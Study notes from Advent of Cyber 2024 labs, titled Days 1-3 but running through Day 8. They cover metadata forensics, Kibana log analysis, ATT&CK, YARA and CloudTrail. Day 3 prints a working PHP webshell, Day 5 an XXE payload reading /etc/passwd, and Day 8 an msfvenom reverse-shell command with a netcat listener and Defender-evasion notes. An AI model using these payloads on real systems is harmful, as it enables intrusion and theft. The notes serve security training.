# Advent of Cyber 2024 — Days 1-3 Notes

---

## Day 1 — OPSEC (Operational Security)

### Topic
OPSEC investigation — tracing a malicious actor through metadata left in files.

### Key Concepts

**What is OPSEC?**
- OPSEC = Operational Security
- The practice of protecting sensitive information from adversaries
- Attackers fail OPSEC when they leave behind traceable artifacts (metadata, usernames, links, real names)

**What is Metadata?**
- Hidden data embedded inside files (images, audio, documents)
- Contains: author name, creation date, software used, GPS location, source URL
- Attackers often forget to strip metadata — this is how they get caught

### Tools Used

| Tool | Purpose |
|---|---|
| `file` | Identify true file type |
| `exiftool` | Extract metadata from files |

### Commands
```bash
# Check file type
file filename.mp3

# Extract all metadata
exiftool filename.mp3
```

### Methodology
1. Download suspicious file
2. Check file type with `file` — it may not be what it claims
3. Run `exiftool` to extract metadata
4. Look for: author names, URLs, GitHub links, email addresses
5. Follow the trail — GitHub username → real identity → OPSEC fail

### Key Takeaway
> Attackers who reuse usernames, link to personal GitHub repos, or forget to strip metadata expose their real identity. OPSEC failures are how threat actors get caught.

---

## Day 2 — Log Analysis with ELK (Elastic Stack)

### Topic
Investigating a cyberattack using logs in Kibana (ELK Stack).

### Key Concepts

**What is the ELK Stack?**
- **E**lasticsearch — stores and indexes logs
- **L**ogstash — collects and processes logs
- **K**ibana — visualizes logs (the UI you used)

**What is a SIEM?**
- Security Information and Event Management
- Collects logs from all systems in one place
- Analysts use it to detect attacks, investigate incidents

**Windows Event IDs (critical to memorize)**

| Event ID | Meaning |
|---|---|
| 4624 | Successful logon |
| 4625 | Failed logon |
| 4672 | Special privileges assigned |
| 4648 | Logon with explicit credentials |

### Tools Used
- **Kibana / ELK Discover** — searching and filtering logs
- **KQL** — Kibana Query Language

### KQL Filters Used
```
event.outcome: failure
event.category: authentication
NOT winlog.record_id: 6476
```

### Methodology
1. Open Kibana Discover
2. Set time range to match the incident window
3. Add filters: `event.outcome: failure` + `event.category: authentication`
4. Count the hits — total failed logon attempts
5. Look for patterns — same source IP? Same username? Same target host?

### Key Finding
- 6,789 failed authentication events detected
- All failures targeted `service_admin` account
- Source IP: `10.0.255.1` — brute force attack pattern
- Multiple WareHosts targeted — coordinated attack

### Key Takeaway
> Brute force attacks generate hundreds or thousands of failed logon events. A SIEM makes this visible instantly. Filter by `event.outcome: failure` + `event.category: authentication` to isolate them.

---

## Day 3 — RCE via File Upload

### Topic
Remote Code Execution (RCE) by uploading a malicious PHP file through a web application.

### Key Concepts

**What is RCE?**
- Remote Code Execution = ability to run commands on a target server from outside
- One of the most critical vulnerabilities (CVSS score 9-10)
- File upload vulnerabilities are a common RCE vector

**What is a File Upload Vulnerability?**
- Web app accepts file uploads but doesn't properly validate file type
- Attacker uploads a malicious script (e.g. PHP webshell) instead of an image
- Server executes the script when accessed via browser

**What is a Webshell?**
- A script uploaded to a server that lets you run OS commands via the browser
- PHP webshell is the most common type

### Attack Methodology

```
Step 1 — Reconnaissance: Browse all pages looking for file upload
Step 2 — Find upload point: Admin panel → Add Room → image upload field
Step 3 — Create malicious file: Save shell.php with webshell code
Step 4 — Upload: Upload shell.php through the file upload form
Step 5 — Find the file: Navigate to /uploads/ or similar directory
Step 6 — Trigger execution: Access shell.php via browser URL
Step 7 — Run commands: Use the command input to read files, explore server
Step 8 — Get the flag: cat the target .txt file
```

### The PHP Webshell Used
```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="text" name="command" autofocus id="command">
<input type="submit" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['command']))
    {
        system($_GET['command'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```

### How It Works
- The form takes user input via GET parameter `command`
- `system()` executes it as an OS command on the server
- Output is printed back to the browser
- You now have full command execution on the server

### Useful Commands After RCE
```bash
# Find files
ls /
ls /var/www/html

# Read a file
cat filename.txt

# Find flags
find / -name "*.txt" 2>/dev/null

# Who are we running as?
whoami

# What OS?
uname -a
```

### Key Takeaway
> File upload vulnerabilities are critical. If a server accepts a PHP file and executes it, you have RCE. Always look for upload forms in admin panels, account pages, and reservation systems. The attack chain is: find upload → upload webshell → access it → run commands.

---

## Day 4 — Atomic Red Team + MITRE ATT&CK Framework

### Topic
Simulating real attacks using Atomic Red Team and detecting them using the MITRE ATT&CK framework.

### Key Concepts

**What is MITRE ATT&CK?**
- A knowledge base of real-world attacker Tactics, Techniques and Procedures (TTPs)
- Used by both red teams (attackers) and blue teams (defenders)
- Organized into: Tactics (what they want) → Techniques (how they do it)
- Example: Tactic = Execution, Technique = T1566.001 (Spearphishing Attachment)

**What is Atomic Red Team?**
- Open source library of attack simulations mapped to MITRE ATT&CK
- Each "atomic test" simulates one specific TTP
- Used to test if your defenses can detect that attack
- Free: github.com/redcanaryco/atomic-red-team

**What is the Cyber Kill Chain?**
- A model describing the stages of a cyberattack
- Stages: Reconnaissance → Weaponization → Delivery → Exploitation → Installation → C2 → Actions
- Blue team goal: detect the attacker at as many stages as possible

**What are Detection Gaps?**
- Points in the kill chain where attacks go undetected
- Atomic Red Team helps find these gaps by simulating attacks and checking if alerts fire

### Attack Simulated
- Technique: **T1566.001 — Spearphishing Attachment**
- Simulated a phishing email with a malicious Excel file (PhishingAttachment.xlsm)
- Atomic Red Team ran the test, creating artifacts on the system

### Investigation Methodology
```
Step 1 — Run Atomic Red Team test for a specific TTP
Step 2 — Check Sysmon event logs for artifacts created
Step 3 — Identify Indicators of Compromise (IOCs)
Step 4 — Write detection rules (Sigma, Yara, Snort) based on IOCs
Step 5 — Import rules into SIEM/EDR for future detection
```

### Key Commands Used
```powershell
# Run an Atomic Red Team test
Invoke-AtomicTest T1566.001

# Find the artifact
cd C:\Users\Administrator\AppData\Local\Temp\
cat PhishingAttachment.txt
```

### Detection Rule Formats

| Format | Used In |
|---|---|
| Sigma | SIEM (generic, converts to any platform) |
| Yara | File/malware scanning |
| Snort | Network IDS |

### Key Takeaway
> Atomic Red Team lets you attack your own systems in a controlled way to find detection gaps. MITRE ATT&CK gives the framework to understand what the attack means. Together they form the core of purple teaming — where red and blue work together to improve defenses.

---

## Day 5 — XXE Injection + Burp Suite

### Topic
Exploiting XML External Entity (XXE) injection using Burp Suite to read sensitive files from a server.

### Key Concepts

**What is XML?**
- eXtensible Markup Language — used to store and transport data
- Structured with tags like HTML
```xml
<user>
  <name>Sundeep</name>
  <role>admin</role>
</user>
```

**What is XXE?**
- XML External Entity injection
- Attacker injects a malicious XML entity that references an external file or resource
- Server parses it and returns the file contents to the attacker
- Can read: `/etc/passwd`, config files, source code, secrets

**What is Burp Suite?**
- The #1 tool for web application penetration testing
- Acts as a proxy — intercepts HTTP requests between browser and server
- You can modify requests before they reach the server

### Attack Methodology
```
Step 1 — Set up Burp Suite as proxy, intercept traffic
Step 2 — Find a feature that sends XML data (wishlist, cart, checkout)
Step 3 — Intercept the POST request containing XML
Step 4 — Inject malicious XXE payload into the XML
Step 5 — Server parses XML and returns file contents
Step 6 — Read sensitive files (/etc/passwd, flags etc.)
```

### XXE Payload
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<wishlist>
  <item>&xxe;</item>
</wishlist>
```
- `ENTITY xxe` defines an external entity pointing to a file
- `&xxe;` references it — server replaces it with file contents

### Tools Used
| Tool | Purpose |
|---|---|
| Burp Suite | Intercept and modify HTTP requests |
| Browser proxy (FoxyProxy) | Route traffic through Burp |

### Key Takeaway
> XXE is a web vulnerability where an application parses XML input without disabling external entity references. Always use Burp Suite to intercept requests when testing web apps — it lets you see and modify exactly what data is being sent to the server.

---

## Day 6 — Malware Analysis + YARA Rules + Sandboxes

### Topic
Analyzing malware behavior in a sandbox environment and detecting it using YARA rules.

### Key Concepts

**What is a Sandbox?**
- An isolated environment where malware can run safely without affecting the real system
- Used for dynamic malware analysis — watching what malware actually does
- Tools: FlareVM, Any.run, Cuckoo Sandbox

**What is YARA?**
- A tool for writing rules to detect malware based on patterns
- Scans files/processes for strings, byte sequences, or behaviors
- Used by EDRs, antivirus, and SIEMs

**What is an EDR?**
- Endpoint Detection and Response
- Monitors endpoints for malicious activity in real time
- Triggers alerts when YARA rules match

**What is Sysmon?**
- Part of Microsoft Sysinternals suite
- Logs detailed system activity: process creation, network connections, file changes
- Key Event IDs for malware analysis:

| Event ID | Meaning |
|---|---|
| 1 | Process creation |
| 3 | Network connection |
| 11 | File created |

**What is FLOSS?**
- FireEye Labs Obfuscated String Solver
- Extracts hidden/obfuscated strings from malware binaries
- Reveals hardcoded URLs, commands, keys that malware tries to hide

### Attack/Defense Methodology
```
Step 1 — Run malware in sandbox (safe environment)
Step 2 — Use FLOSS to extract obfuscated strings from binary
Step 3 — Use Sysmon to log what the malware does (processes, files, network)
Step 4 — Write YARA rules based on discovered patterns
Step 5 — EDR uses YARA rules to detect future occurrences
Step 6 — Malware authors try to evade by changing strings/behavior
```

### YARA Rule Structure
```yara
rule DetectMalware {
    meta:
        description = "Detects suspicious PowerShell"
    strings:
        $s1 = "Invoke-WebRequest"
        $s2 = "PhishingAttachment"
    condition:
        any of them
}
```

### Malware Evasion Techniques
- Encoding strings in Base64 to avoid string-based detection
- Using obfuscation to hide function names
- Checking if running in a sandbox — if yes, don't execute malicious code

### Tools Used
| Tool | Purpose |
|---|---|
| FlareVM | Windows malware analysis environment |
| YARA | Pattern-based malware detection |
| FLOSS | Extract obfuscated strings from malware |
| Sysmon | Log system events for malware behavior |
| EDR | Real-time endpoint threat detection |
| PowerShell | Script execution and analysis |

### Key Takeaway
> Malware analysis = understanding what malicious code does. Sandboxes let you run it safely. YARA rules let you detect it. FLOSS reveals what it's hiding. Sysmon logs everything it touches. This is core blue team / SOC analyst work.

---

## Day 7 — AWS Log Analysis (CloudTrail + CloudWatch)

### Topic
Investigating a cloud attack by analyzing AWS CloudTrail and CloudWatch logs using `jq`.

### Key Concepts

**What is AWS CloudTrail?**
- AWS service that logs every API call made in your AWS account
- Records: who did what, when, from where
- Stored in JSON format
- Default enabled for all AWS accounts
- Used for security auditing and incident response

**What is AWS CloudWatch?**
- AWS monitoring service
- Monitors resources and applications in real time
- Stores logs from services like RDS (databases), EC2, Lambda
- CloudWatch RDS logs = database query logs

**What is S3?**
- Amazon Simple Storage Service — cloud file storage
- Attackers target S3 buckets to steal data or plant malicious files
- Key actions to watch: `ListObject`, `PutObject`, `GetObject`, `DeleteObject`

**What is `jq`?**
- Command line tool for parsing and filtering JSON data
- Essential for reading CloudTrail logs

### Attack Investigated
- Attacker (`glitch`) accessed an S3 bucket
- Performed `ListObject` (browsed files) and `PutObject` (uploaded malicious file)
- Modified bank transaction details — redirected donations to attacker's account

### Investigation Methodology
```
Step 1 — Access CloudTrail log (cloudtrail_log.json)
Step 2 — Use jq to filter logs by username
Step 3 — Identify suspicious actions (PutObject on S3)
Step 4 — Cross-reference with CloudWatch RDS logs
Step 5 — Reconstruct attack timeline
```

### Key `jq` Commands
```bash
# View all records for a specific user
jq -r '["Event_Time","Event_Source","Event_Name","User_Name","Source_IP"],
(.Records[] | select(.userIdentity.userName == "glitch") |
[.eventTime, .eventSource, .eventName,
.userIdentity.userName // "N/A",
.sourceIPAddress // "N/A"]) | @tsv' cloudtrail_log.json | column -t -s $'\t'

# List all unique usernames
jq '.Records[].userIdentity.userName' cloudtrail_log.json | sort -u
```

### Attack Timeline Reconstructed
```
15:22:17 — Last legitimate donation received by Care4wares Fund
15:22:39 — Glitch modifies S3 bucket (PutObject) — bank details changed
15:23:02 — First donation redirected to Mayor Malware's account
```

### AWS Security Key Actions to Monitor

| Action | Meaning |
|---|---|
| ListObject | Browsing S3 bucket contents |
| PutObject | Uploading/modifying files in S3 |
| GetObject | Downloading files from S3 |
| DeleteObject | Deleting files from S3 |
| ConsoleLogin | User logged into AWS console |

### Key Takeaway
> Cloud attacks leave trails in CloudTrail. `jq` is your best friend for parsing JSON logs. Always correlate CloudTrail (API actions) with CloudWatch (application logs) to reconstruct what an attacker did. S3 bucket tampering is a common attack vector — monitor PutObject events closely.

---

## Day 8 — Shellcodes + Reverse Shell + PowerShell

### Topic
Using shellcode to get a reverse shell on a Windows machine, bypassing Windows Defender using PowerShell.

### Key Concepts

**What is Shellcode?**
- Small piece of code used as payload in exploits (e.g. buffer overflows)
- Typically written in assembly language
- Goal: execute arbitrary commands or give attacker control of the system
- Delivered through vulnerabilities and executed directly in memory

**What is a Reverse Shell?**
- Target machine connects BACK to attacker's machine
- Attacker listens on a port, victim initiates connection
- Bypasses firewalls (outbound traffic usually allowed)
- Opposite of bind shell (where attacker connects to victim)

**What is msfvenom?**
- Part of Metasploit Framework
- Generates shellcode/payloads for various platforms
- Can output in many formats: exe, powershell, python, raw bytes etc.

**What is Windows Defender bypass?**
- Windows Defender scans scripts and executables for malicious patterns
- Bypass techniques: obfuscation, reflective injection, running code in memory
- PowerShell can load shellcode directly into memory — harder to detect

### Tools Used
| Tool | Purpose |
|---|---|
| msfvenom | Generate reverse shell shellcode |
| Netcat (nc) | Listen for incoming reverse shell connection |
| PowerShell | Execute shellcode in memory on Windows |
| Metasploit | Framework for exploitation |

### Attack Methodology
```
Step 1 — Generate shellcode with msfvenom
Step 2 — Start listener on attacker machine with netcat
Step 3 — Inject shellcode into PowerShell script
Step 4 — Execute PowerShell script on target machine
Step 5 — Target connects back to attacker (reverse shell)
Step 6 — Execute commands on target remotely
```

### Key Commands
```bash
# Generate Windows reverse shell shellcode (PowerShell format)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f powershell

# Start listener on attacker machine
nc -nvlp 4444

# Read flag after getting shell
type C:\Users\glitch\Desktop\flag.txt
```

### PowerShell Shellcode Execution (Key Windows API calls)
```powershell
# VirtualAlloc — allocates memory for shellcode
VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect)

# CreateThread — creates a thread to execute shellcode
CreateThread(lpThreadAttributes, dwStackSize, lpStartAddress, ...)

# WaitForSingleObject — waits for thread to finish
WaitForSingleObject(hHandle, dwMilliseconds)
```

### Key Takeaway
> Shellcode runs directly in memory — no file written to disk, making it harder for antivirus to detect. msfvenom generates shellcode. Netcat listens for the reverse connection. This is the foundation of post-exploitation and is critical knowledge for pentesting and eJPT/OSCP.

---

## Tools Summary

| Tool | Use Case |
|---|---|
| `exiftool` | Extract metadata from files |
| `file` | Identify true file type |
| Kibana / ELK | Log analysis and SIEM investigation |
| KQL | Filter and query logs in Kibana |
| CyberChef | Decode Base64, encoded commands |

## Concepts Summary

| Concept | One-liner |
|---|---|
| OPSEC | Protecting your identity — attackers fail this via metadata |
| Metadata | Hidden data in files that reveals origin and author |
| ELK Stack | Elasticsearch + Logstash + Kibana — the standard SIEM stack |
| Event ID 4625 | Windows failed logon — key indicator of brute force |
| Event ID 4624 | Windows successful logon — find the breach point |
| DFIR | Digital Forensics and Incident Response — reconstruct attack timeline |
| Base64 | Encoding scheme — attackers use it to hide PowerShell commands |
